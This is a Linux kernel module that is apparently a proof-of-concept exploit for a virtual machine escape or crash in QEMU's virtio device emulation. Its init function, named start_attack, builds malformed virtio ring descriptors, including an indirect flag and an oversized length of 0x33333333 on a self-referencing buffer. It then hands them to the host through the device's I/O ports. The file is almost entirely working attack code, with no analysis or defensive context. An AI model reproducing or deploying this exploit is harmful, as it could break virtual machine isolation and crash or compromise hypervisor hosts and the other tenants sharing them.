#include <linux/module.h>
#include <linux/init.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>

#define BASE_IO 0xc040

// struct VirtQueue
// {
//     VRing vring;

//     /* Next head to pop */
//     uint16_t last_avail_idx;

//     /* Last avail_idx read from VQ. */
//     uint16_t shadow_avail_idx;

//     uint16_t used_idx;

//     /* Last used index value we have signalled on */
//     uint16_t signalled_used;

//     /* Last used index value we have signalled on */
//     bool signalled_used_valid;

//     /* Notification enabled? */
//     bool notification;

//     uint16_t queue_index;

//     int inuse;

//     uint16_t vector;
//     void (*handle_output)(VirtIODevice *vdev, VirtQueue *vq);
//     void (*handle_aio_output)(VirtIODevice *vdev, VirtQueue *vq);
//     VirtIODevice *vdev;
//     EventNotifier guest_notifier;
//     EventNotifier host_notifier;
//     QLIST_ENTRY(VirtQueue) node;
// };

typedef struct VRing
{
    unsigned int num;
    unsigned int num_default;
    unsigned int align;
    uint64_t desc;
    uint64_t avail;
    uint64_t used;
} VRing;

typedef struct VRingDesc
{
    uint64_t addr;
    uint32_t len;
    uint16_t flags;
    uint16_t next;
} VRingDesc;

typedef struct VRingAvail
{
    uint16_t flags;
    uint16_t idx;
    uint16_t ring[0];
} VRingAvail;

typedef struct VRingUsedElem
{
    uint32_t id;
    uint32_t len;
} VRingUsedElem;

typedef struct VRingUsed
{
    uint16_t flags;
    uint16_t idx;
    VRingUsedElem ring[0];
} VRingUsed;

void set_queue_sel(u32 val){
    outw(val,BASE_IO+14);
}

void set_vq2vring_addr(u32 val){
    val = val >> 12;
    outl(val,BASE_IO+8);
}

void handle_ctrl(u32 val){
    set_queue_sel(0);
    set_vq2vring_addr(val);
    outl(0,BASE_IO+16);
}

void handle_event(u32 val){
    set_queue_sel(1);
    set_vq2vring_addr(val);
    outl(1,BASE_IO+16);
}

void handle_cmd(u32 val){
    set_queue_sel(2);
    set_vq2vring_addr(val);
    outl(2,BASE_IO+16);
}

static int start_attack(void){
    void *new_area;
    VRingAvail *VRingAvail1;
    VRingDesc *VRingDesc1;
    
    new_area = kmalloc(0x10000,GFP_KERNEL);
    VRingDesc1 = new_area;
    VRingAvail1 = new_area+0x800;

    VRingDesc1->addr = virt_to_phys(new_area+0x2000);//out
    VRingDesc1->len = 0x2000;
    VRingDesc1->flags = 0x8 | 1;
    VRingDesc1->next = 0x1;

    VRingDesc1[1].addr = virt_to_phys(new_area+0x2000);//in
    VRingDesc1[1].len = 0x33333333;
    VRingDesc1[1].flags = 0x2;
    VRingDesc1[1].next = 0x1;

    VRingAvail1->flags = 0x1;
    VRingAvail1->idx = 0x100;
    VRingAvail1->ring[0] = 0x0;

    handle_cmd(virt_to_phys(new_area));

    return 0;
}

static void exit_attack(void){
	printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");